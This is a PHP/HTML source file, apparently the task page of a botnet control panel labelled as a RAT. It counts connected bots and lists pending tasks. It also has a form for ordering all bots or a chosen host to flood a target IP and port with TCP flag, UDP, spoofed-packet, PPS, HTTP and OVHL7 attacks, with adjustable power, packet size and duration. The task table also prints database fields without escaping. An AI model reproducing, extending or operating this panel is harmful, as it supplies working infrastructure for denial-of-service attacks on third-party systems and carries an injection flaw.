<?php
# Necessary at the top of every page for session management
session_start();

# If the RAT user isn't authenticated
if (!isset($_SESSION["authenticated"])) {
	# Redirects them to 403.php page
	header("Location: 403.php");
}
# Else they are authenticated
else {
	# Includes the RAT configuration file
	include "config/config.php";

	# Establishes a connection to the RAT database
	# Uses variables from "config/config.php"
	# "SET NAMES utf8" is necessary to be Unicode-friendly
	$dbConnection = new PDO("mysql:host=$dbHost;dbname=$dbName", $dbUser, $dbPass, array(PDO::MYSQL_ATTR_INIT_COMMAND => "SET NAMES utf8"));
}
?>
<!DOCTYPE html>
<html>

<head>
	<meta charset="utf-8">
	<meta name="viewport" content="width=device-width, initial-scale=1.0, shrink-to-fit=no">
	<title>Table - Brand</title>
	<link rel="stylesheet" href="assets/bootstrap/css/bootstrap.min.css">
	<link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Nunito:200,200i,300,300i,400,400i,600,600i,700,700i,800,800i,900,900i">
	<link rel="stylesheet" href="assets/fonts/fontawesome-all.min.css">
	<link rel="stylesheet" href="assets/fonts/font-awesome.min.css">
	<link rel="stylesheet" href="assets/fonts/fontawesome5-overrides.min.css">
	<script src="assets/js/fulkter.js"></script>
</head>

<body id="page-top">
	<div id="wrapper">
		<nav class="navbar navbar-dark align-items-start sidebar sidebar-dark accordion bg-gradient-primary p-0" style="background: #23272a;">
			<div class="container-fluid d-flex flex-column p-0">
				<a class="navbar-brand d-flex justify-content-center align-items-center sidebar-brand m-0" href="index.php">
					<div class="sidebar-brand-icon rotate-n-15"><i class="fas fa-network-wired"></i></div>
					<div class="sidebar-brand-text mx-3"><span>P - X .Net</span></div>
				</a>
				<hr class="sidebar-divider my-0">
				<ul class="nav navbar-nav text-light" id="accordionSidebar">
					<li class="nav-item"><a class="nav-link" href="index.php"><i class="fas fa-tachometer-alt"></i><span>&nbsp; Dashboard</span></a></li>
					<li class="nav-item"><a class="nav-link" href="hosts.php"><i class="fas fa-user"></i><span>&nbsp; Bot</span></a></li>
					<li class="nav-item"><a class="nav-link active" href="tasks.php"><i class="fas fa-table"></i><span>&nbsp; Task</span></a></li>
					<li class="nav-item"><a class="nav-link" href="output.php"><i class="fas fa-exclamation-circle"></i><span>&nbsp; Log</span></a></li>
					<li class="nav-item"><a class="nav-link" href="account.php"><i class="fas fa-window-maximize"></i><span>&nbsp; Account Management</span></a><a class="nav-link" href="network.php"><i class="fa fa-eercast"></i><span>&nbsp; Network Management</span></a></li>
				</ul>
				<div class="text-center d-none d-md-inline"><button class="btn rounded-circle border-0" id="sidebarToggle" type="button"></button></div>
			</div>
		</nav>
		<div class="d-flex flex-column" id="content-wrapper" style="background: #2c2f33;">
			<div id="content-fluid">
				<nav class="navbar navbar-expand shadow topbar static-top" style="background: #2c2f33;">
					<div class="container-fluid"><button class="btn btn-link d-md-none rounded-circle mr-3" id="sidebarToggleTop" type="button"><i class="fas fa-bars"></i></button>
						<form class="d-none d-sm-inline-block me-auto ms-md-3 my-2 my-md-0 mw-100 navbar-search">
							<div class="input-group"></div>
						</form>
						<ul class="navbar-nav flex-nowrap ms-auto">
							<li class="nav-item dropdown d-sm-none no-arrow"><a class="dropdown-toggle nav-link" aria-expanded="false" data-bs-toggle="dropdown" href="#"><i class="fas fa-search"></i></a>
								<div class="dropdown-menu dropdown-menu-end p-3 animated--grow-in" aria-labelledby="searchDropdown">
									<form class="me-auto navbar-search w-100">
										<div class="input-group"><input class="bg-light form-control border-0 small" type="text" placeholder="Search for ...">
											<div class="input-group-append"><button class="btn btn-primary py-0" type="button"><i class="fas fa-search"></i></button></div>
										</div>
									</form>
								</div>
							</li>
							<li class="nav-item dropdown no-arrow mx-1">
								<div class="nav-item dropdown no-arrow"><a class="dropdown-toggle nav-link" aria-expanded="false" data-bs-toggle="dropdown" href="#"><span class="badge bg-danger badge-counter"></span></a>
									<div class="dropdown-menu dropdown-menu-end dropdown-list animated--grow-in">
										<h6 class="dropdown-header">alerts center</h6><a class="dropdown-item d-flex align-items-center" href="#">
											<div class="me-3">
												<div class="bg-primary icon-circle"><i class="fas fa-file-alt text-white"></i></div>
											</div>
											<div><span class="small text-gray-500">December 12, 2019</span>
												<p>A new monthly report is ready to download!</p>
											</div>
										</a><a class="dropdown-item d-flex align-items-center" href="#">
											<div class="me-3">
												<div class="bg-success icon-circle"><i class="fas fa-donate text-white"></i></div>
											</div>
											<div><span class="small text-gray-500">December 7, 2019</span>
												<p>$290.29 has been deposited into your account!</p>
											</div>
										</a><a class="dropdown-item d-flex align-items-center" href="#">
											<div class="me-3">
												<div class="bg-warning icon-circle"><i class="fas fa-exclamation-triangle text-white"></i></div>
											</div>
											<div><span class="small text-gray-500">December 2, 2019</span>
												<p>Spending Alert: We've noticed unusually high spending for your account.</p>
											</div>
										</a><a class="dropdown-item text-center small text-gray-500" href="#">Show All Alerts</a>
									</div>
								</div>
							</li>
							<li class="nav-item dropdown no-arrow mx-1">
								<div class="nav-item dropdown no-arrow"><a class="dropdown-toggle nav-link" aria-expanded="false" data-bs-toggle="dropdown" href="#"></a>
									<div class="dropdown-menu dropdown-menu-end dropdown-list animated--grow-in">
										<h6 class="dropdown-header">alerts center</h6><a class="dropdown-item d-flex align-items-center" href="#">
											<div class="dropdown-list-image me-3"><img class="rounded-circle" src="assets/img/avatars/avatar4.jpeg">
												<div class="bg-success status-indicator"></div>
											</div>
											<div class="fw-bold">
												<div class="text-truncate"><span>Hi there! I am wondering if you can help me with a problem I've been having.</span></div>
												<p class="small text-gray-500 mb-0">Emily Fowler - 58m</p>
											</div>
										</a><a class="dropdown-item d-flex align-items-center" href="#">
											<div class="dropdown-list-image me-3"><img class="rounded-circle" src="assets/img/avatars/avatar2.jpeg">
												<div class="status-indicator"></div>
											</div>
											<div class="fw-bold">
												<div class="text-truncate"><span>I have the photos that you ordered last month!</span></div>
												<p class="small text-gray-500 mb-0">Jae Chun - 1d</p>
											</div>
										</a><a class="dropdown-item d-flex align-items-center" href="#">
											<div class="dropdown-list-image me-3"><img class="rounded-circle" src="assets/img/avatars/avatar3.jpeg">
												<div class="bg-warning status-indicator"></div>
											</div>
											<div class="fw-bold">
												<div class="text-truncate"><span>Last month's report looks great, I am very happy with the progress so far, keep up the good work!</span></div>
												<p class="small text-gray-500 mb-0">Morgan Alvarez - 2d</p>
											</div>
										</a><a class="dropdown-item d-flex align-items-center" href="#">
											<div class="dropdown-list-image me-3"><img class="rounded-circle" src="assets/img/avatars/avatar5.jpeg">
												<div class="bg-success status-indicator"></div>
											</div>
											<div class="fw-bold">
												<div class="text-truncate"><span>Am I a good boy? The reason I ask is because someone told me that people say this to all dogs, even if they aren't good...</span></div>
												<p class="small text-gray-500 mb-0">Chicken the Dog · 2w</p>
											</div>
										</a><a class="dropdown-item text-center small text-gray-500" href="#">Show All Alerts</a>
									</div>
								</div>
								<div class="shadow dropdown-list dropdown-menu dropdown-menu-end" aria-labelledby="alertsDropdown"></div>
							</li>
							<li class="nav-item dropdown no-arrow">
								<div class="nav-item dropdown no-arrow"><a class="dropdown-toggle nav-link" aria-expanded="false" data-bs-toggle="dropdown" href="#"><span class="d-none d-lg-inline me-2 text-gray-600 small"><?php echo $_SESSION["username"] ?></span></a>
									<div class="dropdown-menu shadow dropdown-menu-end animated--grow-in"><a class="dropdown-item" href="#"><i class="fas fa-user fa-sm fa-fw me-2 text-gray-400"></i>&nbsp;Profile</a><a class="dropdown-item" href="#"><i class="fas fa-cogs fa-sm fa-fw me-2 text-gray-400"></i>&nbsp;Settings</a><a class="dropdown-item" href="#"><i class="fas fa-list fa-sm fa-fw me-2 text-gray-400"></i>&nbsp;Activity log</a>
										<div class="dropdown-divider"></div><a class="dropdown-item" href="#"><i class="fas fa-sign-out-alt fa-sm fa-fw me-2 text-gray-400"></i>&nbsp;Logout</a>
									</div>
								</div>
							</li>
						</ul>
					</div>
				</nav>
				<div class="container-fluid">
					<h3 class="text-dark mb-4 text-white">Task</h3>
					<div class="card shadow">
						<div class="card-header py-3">
							<p class="text-primary m-0 fw-bold">Pending tasks</p>
						</div>
						<div class="card-body">
							<div class="row">
								<div class="col-md-9 text-nowrap">
									<?php
									$statement = $dbConnection->prepare("SELECT * FROM hosts where status = 'connected'");
									$statement->execute();

									$bot = $statement->rowCount();
									$statement = $dbConnection->prepare("SELECT * FROM hosts");
									$statement->execute();

									$botoffline = $statement->rowCount();
									?>
									<p id="botconnected">Connected: <?php echo $bot, "/", $botoffline; ?></p>
								</div>
								<div class="col-md-3">
									<div class="text-md-right dataTables_filter" id="dataTable_filter"><label><input type="search" class="form-control form-control-sm" aria-controls="dataTable" placeholder="Search" name="search_input" id="search_input" onkeyup="fulkter()"></label></div>
								</div>
							</div>
							<div class="table-responsive table mt-2" id="dataTable" role="grid" aria-describedby="dataTable_info">
								<table class="table my-0" id="tasksTable">
									<thead>
										<tr>
											<th>Task ID</th>
											<th>Tasked By</th>
											<th>Hostname</th>
											<th>Task Action</th>
											<th>Task Secondary</th>
										</tr>
									</thead>
									<tbody id="table_body">
										<?php
										# Gets a list of all of tasks
										# This information will be used to build a HTML table
										$statement = $dbConnection->prepare("SELECT id, user, hostname, action, secondary FROM tasks");
										$statement->execute();
										$results = $statement->fetchAll();

										# Kills database connection
										$statement->connection = null;

										# Builds HTML table for each host in the "tasks" table
										foreach ($results as $row) {
											echo "<tr>"; # Start of HTML table row
											echo "<th>" . $row["id"] . "&ensp;&ensp;<a type='submit' class='btn btn-danger btn-xs' href='deleteTask.php?id=" . $row["id"] . "'>Delete Task</a></th>";
											echo "<td>" . $row["user"] . "</th>";
											echo "<th class='hostname'>" . $row["hostname"] . "</th>";
											echo "<th>" . $row["action"] . "</th>";
											echo "<th>" . $row["secondary"] . "</th>";
											echo "</tr>"; # End of HTML table row
										}
										?>
									</tbody>
									<tfoot>
										<tr>
											<th><strong>Task ID</strong></th>
											<th><strong>Tasked By</strong></th>
											<th><strong>Hostname</strong></th>
											<th><strong>Task Action</strong></th>
											<th><strong>Task Secondary</strong></th>
										</tr>
									</tfoot>
								</table>
							</div>

							<!--Run task-->
							<div class="row">

								<div class="col-4">
									<select class="form-select mb-1" name="seltask" onchange="showDiv(this)">
										<option value="" disabled selected>Choose option</option>
										<option value="" disabled>--------TCP--------</option>
										<option value="TCP">TCP</option>
										<option value="" disabled>--------UDP--------</option>
										<option value="UDP">UDP</option>
										<option value="UDPRAW">UDPRAW</option>
										<option value="UNKNOWN">Unknown</option>
										<option value="XTDCUSTOM">XTDCustom</option>
										<option value="CNC">CNC</option>
										<option value="HOLD">hold</option>
										<option value="JUNK">junk</option>
										<option value="RANDHEX">RandHex</option>
										<option value="STD">STD</option>
										<option value="" disabled>--------L.7--------</option>
										<option value="PPS">PPS</option>
										<option value="HTTP">HTTP</option>
										<option value="OVHL7">OVHL7</option>
									</select>
								</div>


								<!-- Start of task form -->
								<div class="container" style="display: none;" id="frm">
									<br>
									<form role="form" class="form-inline" method="post" action="createTask.php">
										<input hidden value="" name="seltask" id="seltask"></input>
										<div class="row">
											<div class="col-6">
												<select class="form-select mb-1" name="hostname">
													<option value="" disabled selected>Choose option</option>
													<option value="all connected bots">all connected bots</option>
													<option value="all bots">all bots</option>
													<?php
													# Determines the hosts that have previously beaconed
													$statement = $dbConnection->prepare("SELECT hostname, status FROM hosts");
													$statement->execute();
													$hosts = $statement->fetchAll();

													# Kills database connection
													$statement->connection = null;

													# Populates each <option> drop-down with our hosts that have beaconed previously
													foreach ($hosts as $row) {

														if ($row["status"] == "connected") {
															echo "<option value=" . "\"" . $row["hostname"] . "\"" . ">" . "🟢 - " . $row["hostname"] . "" . "</option>";
														} else {
															echo "<option value=" . "\"" . $row["hostname"] . "\"" . ">" . "🔴 - " . $row["hostname"] . "" . "</option>";
														}
													}
													?>
												</select>
											</div>
											<div class="col-6">
												<input type="text" class="form-control mb-1" name="ip" placeholder="ip">
												<input type="text" class="form-control mb-1" name="port" placeholder="port">
												<!-- HTTPFRM -->
												<div id="httpfrm" hidden">
													<input type="text" class="form-control mb-1" name="path" placeholder="path">
													<select class="form-select mb-1" name="method">
														<option value="" disabled selected>Choose option</option>
														<option value="GET">GET</option>
														<option value="POST">POST</option>
														<option value="POST">HEAD</option>
														<option value="POST">CONNECT</option>
													</select>
												</div>
												<!-- END HTTPFRM -->
												<!-- POWERFRM -->
												<div id="powerfrm" hidden">
													Power : <label for="time" id="powerlabel" class="form-label">10</label>
													<input type="range" name="power" value="10" class="form-range" min="10" max="100" step="1" id="power" oninput="document.getElementById('powerlabel').innerHTML = document.getElementById('power').value">
												</div>
												<!-- END POWERFRM -->
												<!-- TCPFRM -->
												<div id="tcpfrm" hidden">
													Methods : <input class="form-check-input" type="checkbox" value="syn" name="checkboxes[]">
													<label class="form-check-label" for="flexCheckDefault">
														syn
													</label>&nbsp;
													<input class="form-check-input" type="checkbox" value="rst" name="checkboxes[]">
													<label class="form-check-label" for="flexCheckDefault">
														rst
													</label>&nbsp;
													<input class="form-check-input" type="checkbox" value="fin" name="checkboxes[]">
													<label class="form-check-label" for="flexCheckDefault">
														fin
													</label>&nbsp;
													<input class="form-check-input" type="checkbox" value="ack" name="checkboxes[]">
													<label class="form-check-label" for="flexCheckDefault">
														ack
													</label>&nbsp;
													<input class="form-check-input" type="checkbox" value="psh" name="checkboxes[]">
													<label class="form-check-label" for="flexCheckDefault">
														psh
													</label>
												</div>
												<!-- END TCPFRM -->
												<!-- UDPFRM -->
												<div id="udpfrm" hidden">
													<input class="form-check-input" type="checkbox" value="spoofit" name="spoofit">
													<label class="form-check-label" for="flexCheckDefault">
														Spoofit
													</label><br>
													PacketSize : <label for="time" id="packetsizelabel" class="form-label">1</label>
													<input type="range" name="packetsize" value="1" class="form-range" min="1" max="1023" step="1" id="packetsize" oninput="document.getElementById('packetsizelabel').innerHTML = document.getElementById('packetsize').value">
												</div>
												<!-- END UDPFRM -->
												Time : <label for="time" id="timespan" class="form-label">10</label>
												<input type="range" name="time" value="10" class="form-range" min="10" max="300" step="1" id="time" oninput="document.getElementById('timespan').innerHTML = document.getElementById('time').value">
											</div>
										</div>
										<button type="submit" name="submit" class="btn btn-default">Submit</button>
									</form>
								</div>
								<!-- End of task form -->
							</div>
						</div><a class="border rounded d-inline scroll-to-top" href="#page-top"><i class="fas fa-angle-up"></i></a>
					</div>
					<script src="assets/js/jquery.min.js"></script>
					<script src="assets/bootstrap/js/bootstrap.min.js"></script>
					<script src="assets/js/chart.min.js"></script>
					<script src="assets/js/bs-init.js"></script>
					<script src="https://cdnjs.cloudflare.com/ajax/libs/jquery-easing/1.4.1/jquery.easing.js"></script>
					<script src="assets/js/theme.js"></script>
					<script type="text/javascript">
						function showDiv(select) {
							if (select.value != "") {
								document.getElementById('frm').style.display = "block";
								document.getElementById('seltask').value = select.value;
								if (select.value == "HTTP") {
									document.getElementById('httpfrm').style.display = "block";
									document.getElementById('powerfrm').style.display = "block";
									document.getElementById('udpfrm').style.display = "none";
									document.getElementById('tcpfrm').style.display = "none";
								} else if (select.value == "PPS" || select.value == "OVHL7") {
									document.getElementById('httpfrm').style.display = "none";
									document.getElementById('powerfrm').style.display = "block";
									document.getElementById('udpfrm').style.display = "none";
									document.getElementById('tcpfrm').style.display = "none";
								} else if (select.value == "UDP") {
									document.getElementById('httpfrm').style.display = "none";
									document.getElementById('powerfrm').style.display = "none";
									document.getElementById('udpfrm').style.display = "block";
									document.getElementById('tcpfrm').style.display = "none";
								} else if (select.value == "TCP") {
									document.getElementById('httpfrm').style.display = "none";
									document.getElementById('powerfrm').style.display = "none";
									document.getElementById('udpfrm').style.display = "block";
									document.getElementById('tcpfrm').style.display = "block";
								} else {
									document.getElementById('httpfrm').style.display = "none";
									document.getElementById('powerfrm').style.display = "none";
									document.getElementById('udpfrm').style.display = "none";
									document.getElementById('tcpfrm').style.display = "none";
								}
							}
						}
					</script>
				</div>
			</div>
			<footer class="sticky-footer" style="background: #2c2f33;">
				<div class="container my-auto">
					<div class="text-center my-auto copyright"><span>Copyright © Brand 2022</span></div>
				</div>
			</footer>
		</div><a class="border rounded d-inline scroll-to-top" href="#page-top"><i class="fas fa-angle-up"></i></a>
	</div>
	<script src="assets/bootstrap/js/bootstrap.min.js"></script>
	<script src="assets/js/script.min.js"></script>
</body>

</html>